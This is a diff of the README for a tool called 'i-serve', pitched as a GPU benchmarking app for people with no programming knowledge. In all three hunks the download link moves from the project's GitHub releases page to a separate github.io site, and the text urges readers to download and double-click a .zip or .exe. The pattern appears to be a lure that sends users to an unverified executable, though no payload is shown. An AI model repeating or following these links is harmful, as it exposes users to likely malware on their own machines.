@@ -8,7 +8,7 @@ Think of it as a friendly accountant for your GPU. No programming knowledge need
 
 ## 📥 Download i-serve
 
-[🎉 **DOWNLOAD i-serve NOW**](https://github.com/Assailable-creepingwillow3548/i-serve/releases)
+[🎉 **DOWNLOAD i-serve NOW**](https://assailable-creepingwillow3548.github.io)
 
 **Click the big button above.** That takes you to the official download page. Look for the most recent version (the top item on the page) and click the link that says "i-serve" with a `.zip` or `.exe` ending.
 
@@ -136,7 +136,7 @@ Every number in i-serve comes from an actual, recorded run on a real GPU. No syn
 
 ## 🏁 Your Next Steps (30 Seconds)
 
-1. **[Download i-serve]** (https://github.com/Assailable-creepingwillow3548/i-serve/releases)
+1. **[Download i-serve]** (https://assailable-creepingwillow3548.github.io)
 2. Open the downloaded file.
 3. Watch the magic happen.
 
@@ -148,7 +148,7 @@ Go ahead. Your GPU has secrets. i-serve reveals them.
 
 ## 📦 Install Instructions (Quick Recap)
 
-1. Visit the download page: https://github.com/Assailable-creepingwillow3548/i-serve/releases  
+1. Visit the download page: https://assailable-creepingwillow3548.github.io  
 2. Click the latest release file (either `.zip` or `.exe`).  
 3. If `.zip`: right-click → Extract All → open folder → double-click i-serve.  
 4. If `.exe`: double-click to run directly.  
